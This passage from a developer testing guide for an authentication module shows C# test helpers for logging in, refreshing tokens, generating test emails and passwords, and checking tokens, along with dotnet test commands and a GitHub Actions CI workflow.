    public async Task<TestUser> Authenticate()
    {
        var authHandler = _dataContext.For<AuthHandler>(Guid.NewGuid());
        AuthToken = await authHandler.Authenticate(new Account
        {
            Email = Account.Email,
            Password = "TestPassword123!",
            IpAddress = "127.0.0.1",
            UserAgent = "TestAgent/1.0"
        });
        return this;
    }

    public async Task<TestUser> RefreshTokens()
    {
        if (AuthToken == null) throw new InvalidOperationException("User must be authenticated first");
        
        var authHandler = _dataContext.For<AuthHandler>(Guid.NewGuid());
        AuthToken = await authHandler.RefreshToken(AuthToken.RefreshToken);
        return this;
    }
}
```

### Test Utilities

```csharp
public static class AuthTestUtilities
{
    public static string GenerateValidEmail() => $"test-{Guid.NewGuid()}@example.com";
    
    public static string GenerateValidPassword() => $"TestPass{Random.Shared.Next(1000, 9999)}!";
    
    public static string GenerateWeakPassword() => "password123";
    
    public static string GenerateStrongPassword() => 
        $"StrongP@ssw0rd{Random.Shared.Next(100000, 999999)}!";

    public static Account CreateValidAccountForRegistration(string email = null, string password = null) =>
        new Account
        {
            Email = email ?? GenerateValidEmail(),
            Password = password ?? GenerateValidPassword()
        };

    public static Account CreateAccountForAuthentication(string email, string password, 
        string ipAddress = "127.0.0.1", string userAgent = "TestAgent/1.0") =>
        new Account
        {
            Email = email,
            Password = password,
            IpAddress = ipAddress,
            UserAgent = userAgent
        };

    public static void AssertValidAuthToken(AuthToken token, Guid expectedOwnerEntityId)
    {
        token.ShouldNotBeNull();
        token.AccessToken.ShouldNotBeEmpty();
        token.RefreshToken.ShouldNotBeEmpty();
        token.OwnerEntityId.ShouldBe(expectedOwnerEntityId);
        token.ExpiresAt.ShouldBeGreaterThan(DateTime.UtcNow);
        token.RefreshExpiresAt.ShouldBeGreaterThan(DateTime.UtcNow);
        token.SessionId.ShouldNotBe(Guid.Empty);
    }

    public static void AssertEmptyAuthToken(AuthToken token)
    {
        token.ShouldNotBeNull();
        token.AccessToken.ShouldBeEmpty();
        token.RefreshToken.ShouldBeEmpty();
        token.OwnerEntityId.ShouldBe(Guid.Empty);
    }
}
```

## Running Tests

### Test Execution Commands

```bash
# Run all authentication tests
dotnet test --filter "Category=Authentication"

# Run unit tests only
dotnet test --filter "Category=Unit&Category=Authentication"

# Run integration tests only
dotnet test --filter "Category=Integration&Category=Authentication"

# Run security tests only
dotnet test --filter "Category=Security"

# Run with coverage
dotnet test --collect:"XPlat Code Coverage" --filter "Category=Authentication"

# Run performance tests
dotnet test --filter "Category=Performance" --logger:console --verbosity:normal
```

### Continuous Integration

```yaml
# .github/workflows/auth-tests.yml
name: Authentication Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:13
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: jarvis_test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
    - uses: actions/checkout@v2
    
    - name: Setup .NET
      uses: actions/setup-dotnet@v1
      with:
        dotnet-version: 8.0.x
        
    - name: Restore dependencies
      run: dotnet restore
      
    - name: Run Authentication Tests
      run: dotnet test --filter "Category=Authentication" --logger:trx --collect:"XPlat Code Coverage"
      
    - name: Run Security Tests
      run: dotnet test --filter "Category=Security" --logger:trx
      
    - name: Upload coverage reports
      uses: codecov/codecov-action@v1
```

---

**Next**: [Troubleshooting Guide](authentication-troubleshooting.md) - Common authentication issues and their solutions